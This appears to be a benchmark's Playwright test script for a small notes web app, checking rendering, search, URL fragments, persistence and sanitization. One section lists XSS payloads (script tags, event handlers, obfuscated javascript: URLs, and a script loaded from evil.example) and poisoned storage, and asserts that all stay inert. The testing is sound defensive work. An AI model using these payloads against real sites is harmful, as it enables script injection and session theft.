import { spawn, spawnSync } from 'node:child_process';
import path from 'node:path';
import { chromium } from '/workspace/benchmark/runs/lanes/lane-0/arm-a-vibe/node_modules/@playwright/test/index.mjs';

const dir = '/workspace/benchmark/runs/lanes/lane-0/arm-a-vibe';
const build = spawnSync('pnpm', ['build'], { cwd: dir, stdio: 'ignore' });
if (build.status !== 0) { console.error('build failed'); process.exit(1); }

const port = 4899;
const server = spawn('node', [path.join(dir, 'server.mjs'), '--port', String(port)], { cwd: dir, stdio: 'ignore' });
await new Promise((r) => setTimeout(r, 500));
const base = `http://127.0.0.1:${port}/`;

let pass = 0, fail = 0;
const ok = (name, cond, extra = '') => { if (cond) { pass++; console.log(`  ok   ${name}`); } else { fail++; console.log(`  FAIL ${name} :: ${extra}`); } };

const browser = await chromium.launch();
const errors = [];
const alerts = [];
const page = await browser.newPage();
page.on('pageerror', (e) => errors.push(String(e.message ?? e)));
page.on('console', (m) => m.type() === 'error' && errors.push(m.text()));
page.on('dialog', async (d) => { alerts.push(d.message()); await d.dismiss(); });
page.on('request', (r) => { if (/evil|attacker/.test(r.url())) alerts.push('request ' + r.url()); });

// ---- seed + order
await page.goto(base, { waitUntil: 'load' });
const ids = await page.$$eval('#feed article.note', (n) => n.map((e) => e.dataset.noteId));
ok('seeds 6 notes newest-first', JSON.stringify(ids) === JSON.stringify(['6','5','4','3','2','1']), ids.join(','));

// ---- rich text rendering of fixtures
ok('bold renders', (await page.$$('#feed article[data-note-id="1"] .note-body b')).length === 1);
ok('br renders', (await page.$$('#feed article[data-note-id="1"] .note-body br')).length === 1);
ok('italic renders', (await page.$$('#feed article[data-note-id="2"] .note-body i')).length === 1);
const href = await page.getAttribute('#feed article[data-note-id="4"] .note-body a', 'href');
ok('link renders with href', href === 'https://www.livrarialello.pt/', String(href));
ok('avatar img', (await page.$$('#feed article[data-note-id="1"] img.note-avatar')).length === 1);
ok('no avatar when blank', (await page.$$('#feed article[data-note-id="2"] img.note-avatar')).length === 0);

// ---- search
await page.fill('#search', 'douro');
const filtered = await page.$$eval('#feed article.note', (n) => n.map((e) => e.dataset.noteId));
ok('search filters', JSON.stringify(filtered) === JSON.stringify(['5','2']), filtered.join(','));
ok('results line', (await page.textContent('#results-line')) === 'results for "douro"', await page.textContent('#results-line'));
ok('fragment has q', page.url().endsWith('#q=douro'), page.url());
await page.fill('#search', 'DOURO');
ok('search case-insensitive', (await page.$$('#feed article.note')).length === 2);
await page.fill('#search', '');
ok('empty results line', (await page.textContent('#results-line')) === '');
ok('fragment cleared', !page.url().includes('#'), page.url());
ok('all notes back', (await page.$$('#feed article.note')).length === 6);

// ---- selection
await page.click('#feed article[data-note-id="3"] .note-title');
ok('aria-current set', (await page.getAttribute('#feed article[data-note-id="3"]', 'aria-current')) === 'true');
ok('only one selected', (await page.$$('#feed .note[aria-current="true"]')).length === 1);
ok('fragment note only', page.url().endsWith('#note=3'), page.url());
await page.fill('#search', 'porto');
ok('combined fragment', page.url().endsWith('#q=porto&note=3'), page.url());

// ---- deep link restore
await page.goto(base + '#q=port&note=3', { waitUntil: 'load' });
ok('restores query', (await page.inputValue('#search')) === 'port');
ok('restores results line', (await page.textContent('#results-line')) === 'results for "port"');
ok('restores fragment', page.url().endsWith('#q=port&note=3'), page.url());
await page.goto(base + '#note=5', { waitUntil: 'load' });
ok('restores selection', (await page.getAttribute('#feed article[data-note-id="5"]', 'aria-current')) === 'true');

// ---- hashchange
await page.evaluate(() => { location.hash = '#q=tram'; });
await page.waitForTimeout(100);
ok('hashchange applies query', (await page.inputValue('#search')) === 'tram');

// ---- add a note
await page.goto(base, { waitUntil: 'load' });
await page.fill('#title', 'Sardines at <b>Matosinhos</b>');
await page.fill('#body', 'Line one\nLine two with <i>italics</i> and <a href="https://example.com/x">a link</a>.');
await page.fill('#avatar', 'https://example.com/a.png');
await page.click('#note-form button[type="submit"]');
const top = await page.$eval('#feed article.note', (e) => e.dataset.noteId);
ok('new note id continues sequence', top === '7', String(top));
ok('new note first', (await page.$$('#feed article.note')).length === 7);
ok('title formatting', (await page.$$('#feed article[data-note-id="7"] .note-title b')).length === 1);
ok('body newline -> br', (await page.$$('#feed article[data-note-id="7"] .note-body br')).length === 1);
ok('body link', (await page.getAttribute('#feed article[data-note-id="7"] .note-body a', 'href')) === 'https://example.com/x');
ok('new avatar', (await page.getAttribute('#feed article[data-note-id="7"] img.note-avatar', 'src')) === 'https://example.com/a.png');
ok('form cleared', (await page.inputValue('#title')) === '' && (await page.inputValue('#body')) === '' && (await page.inputValue('#avatar')) === '');

// ---- persistence
await page.reload({ waitUntil: 'load' });
ok('persists after reload', (await page.$$('#feed article.note')).length === 7);
ok('persisted content', (await page.$$('#feed article[data-note-id="7"] .note-title b')).length === 1);

// ---- search matches new note by body text
await page.fill('#search', 'italics');
ok('search matches body', (await page.$$('#feed article.note')).length === 1);
await page.fill('#search', '');

// ---- XSS payloads
const payloads = [
  '<script>window.__pwned=1</script>',
  '<img src=x onerror="window.__pwned=1">',
  '<b onclick="window.__pwned=1">click</b>',
  '<a href="javascript:window.__pwned=1">go</a>',
  '<a href="jaVaScRiPt:window.__pwned=1">go</a>',
  '<a href="java\tscript:window.__pwned=1">go</a>',
  '<svg onload="window.__pwned=1">',
  '<iframe src="javascript:window.__pwned=1"></iframe>',
  '"><script>window.__pwned=1</script>',
  '<b><a href="data:text/html,<script>window.__pwned=1</script>">x</a></b>',
  '<style>body{background:url("javascript:window.__pwned=1")}</style>',
  '<a href=" javascript:window.__pwned=1">sp</a>',
  '<BODY ONLOAD=window.__pwned=1>',
  '<b>a</b><script src="https://evil.example/x.js"></script>',
  '<a href="&#106;avascript:window.__pwned=1">ent</a>',
  '<img src="https://evil.example/pixel.png">',
];
for (const p of payloads) {
  await page.fill('#title', 'x');
  await page.fill('#body', p);
  await page.fill('#avatar', 'javascript:window.__pwned=1');
  await page.click('#note-form button[type="submit"]');
}
await page.waitForTimeout(300);
const pwned = await page.evaluate(() => window.__pwned ?? null);
ok('no payload executed', pwned === null, String(pwned));
ok('no anchors with javascript href', (await page.$$eval('#feed a', (a) => a.filter((e) => /^\s*j/i.test(e.getAttribute('href') || '')).length)) === 0);
ok('no script elements in feed', (await page.$$('#feed script')).length === 0);
ok('no iframes/svg/style injected', (await page.$$('#feed iframe, #feed svg, #feed style, #feed img[onerror]')).length === 0);
ok('javascript: avatar dropped', (await page.$$('#feed img.note-avatar[src^="javascript"]')).length === 0);
ok('payload shown as text', (await page.$eval('#feed article.note .note-body', (e) => e.textContent)).includes('evil.example/pixel.png'));
ok('no dialogs / evil requests', alerts.length === 0, alerts.join('|'));

// reload: stored payloads must stay inert
await page.reload({ waitUntil: 'load' });
await page.waitForTimeout(300);
ok('inert after reload', (await page.evaluate(() => window.__pwned ?? null)) === null);

// ---- fragment injection
await page.goto(base + '#q=%3Cimg%20src%3Dx%20onerror%3Dwindow.__pwned%3D1%3E', { waitUntil: 'load' });
await page.waitForTimeout(200);
ok('fragment query inert', (await page.evaluate(() => window.__pwned ?? null)) === null);
ok('fragment query in results line as text', (await page.textContent('#results-line')).includes('<img src=x'));

// ---- corrupt storage
await page.evaluate(() => localStorage.setItem('porto-notes.notes.v1', '{not json'));
await page.goto(base, { waitUntil: 'load' });
ok('recovers from corrupt storage', (await page.$$('#feed article.note')).length === 6);

// ---- poisoned storage
await page.evaluate(() => localStorage.setItem('porto-notes.notes.v1', JSON.stringify([{ id: 1, title: '<img src=x onerror="window.__pwned=1">', body: '<script>window.__pwned=1</script>', avatar: 'javascript:window.__pwned=1', createdAt: '2026-01-01T00:00:00.000Z' }])));
await page.goto(base, { waitUntil: 'load' });
await page.waitForTimeout(200);
ok('poisoned storage inert', (await page.evaluate(() => window.__pwned ?? null)) === null);
await page.evaluate(() => localStorage.clear());
await page.goto(base, { waitUntil: 'load' });

// ---- empty submit is a no-op
const before = (await page.$$('#feed article.note')).length;
await page.click('#note-form button[type="submit"]');
ok('empty submit ignored', (await page.$$('#feed article.note')).length === before);

// ---- no results
await page.fill('#search', 'zzzznope');
ok('no matches', (await page.$$('#feed article.note')).length === 0);
ok('results line for no matches', (await page.textContent('#results-line')) === 'results for "zzzznope"');

// ---- deep nesting does not hang
await page.fill('#search', '');
await page.fill('#title', 'deep');
await page.fill('#body', '<b>'.repeat(5000) + 'x' + '</b>'.repeat(5000));
const t0 = Date.now();
await page.click('#note-form button[type="submit"]');
ok('deep nesting handled quickly', Date.now() - t0 < 3000, String(Date.now() - t0));

ok('no console/page errors', errors.length === 0, errors.join(' | '));

await browser.close();
server.kill();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);

